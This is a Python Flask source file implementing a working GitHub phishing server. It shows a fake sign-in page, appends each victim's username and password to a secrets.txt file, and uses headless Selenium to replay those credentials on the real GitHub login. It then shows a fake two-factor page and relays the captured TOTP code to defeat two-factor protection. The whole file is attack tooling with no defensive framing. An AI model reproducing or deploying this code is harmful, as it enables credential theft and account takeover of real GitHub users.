from flask import Flask, render_template, request, redirect, session
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time

app = Flask(__name__)
app.secret_key = 'super_secret_key'

GITHUB = "https://github.com"
FILE_PATH = "secrets.txt"

drivers = {}

def get_driver():
    options = webdriver.ChromeOptions()
    options.add_argument("--headless") 
    service = Service(ChromeDriverManager().install())
    return webdriver.Chrome(service=service, options=options)

@app.route('/')
def index():
    return render_template('sign-in.html')

@app.route('/login', methods=['POST'])
def save_data():
    username = request.form['username']
    password = request.form['password']
    
    with open(FILE_PATH, 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")
    
    # Create WebDriver and store in global dictionary
    session_id = session.get('_id', str(time.time()))  # Unique ID per session
    session['_id'] = session_id  # Store it in session for future retrieval

    driver = get_driver()
    drivers[session_id] = driver
    
    driver.get("https://github.com/login")
    
    driver.find_element(By.ID, "login_field").send_keys(username)
    driver.find_element(By.ID, "password").send_keys(password)
    submit_button = driver.find_element(By.NAME, "commit")
    driver.execute_script("arguments[0].click();", submit_button)

    print(f"Current URL after login attempt: {driver.current_url}")
    
    if "two-factor" in driver.current_url:
    	return render_template('two-factor-app.html')
    elif driver.current_url == 'https://github.com/session':
    	return render_template('sign-in.html', error="Incorrect username or password.")
    else:
        return redirect(GITHUB)

@app.route('/two-factor-app', methods=['POST'])
def save_2fa():
    session_id = session.get('_id')
    driver = drivers.get(session_id)  # Retrieve existing driver instance

    if not driver:
        return "Session expired. Please restart login.", 400
    
    auth_code = request.form['auth_code']
    
    with open(FILE_PATH, 'a') as f:
        f.write(f"Authentication Code: {auth_code}\n")
    
    driver.find_element(By.ID, "app_totp").send_keys(auth_code)

    if "two-factor" in driver.current_url:
    	return render_template('two-factor-app.html', error="Two factor authentication failed.")
    else:
    	driver.quit()
    	del drivers[session_id]  # Cleanup WebDriver
    	return redirect(GITHUB)

if __name__ == '__main__':
    app.run(debug=True)

